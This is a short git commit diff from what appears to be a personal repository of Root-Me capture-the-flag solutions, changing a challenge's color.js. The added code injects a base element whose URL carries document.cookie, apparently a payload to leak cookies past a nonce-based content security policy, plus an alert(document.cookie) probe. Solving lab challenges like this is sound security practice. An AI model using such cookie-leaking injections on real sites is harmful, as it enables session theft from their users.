848173212ff7b1ce98602ec4d25503c045d0e4b1
RamdaniRamdane <ramdaniramdane123+1@gmail.com>
2025-12-25 14:58:57 +0100

    try 3

--- root-me/challenges/web-client/nonce2/web-client/ch62/color.js
+++ root-me/challenges/web-client/nonce2/web-client/ch62/color.js
@@ -1,8 +1,14 @@
 
-const color = document.getElementById("color");
-alert(document.cookie);
-const target = document.getElementById("result");
+const base = document.createElement("base");
 
+base.href = "/web-client/ch62/color.js?c="+encodeURIComponent(document.cookie);
+
+base.target = "_blank";
+
+document.head.appendChild(base);
+alert(document.cookie);
+const color = document.getElementById("color");
+const target = document.getElementById("result");
 function getRandomInt(max) {
     return Math.floor(Math.random() * max);
   }  
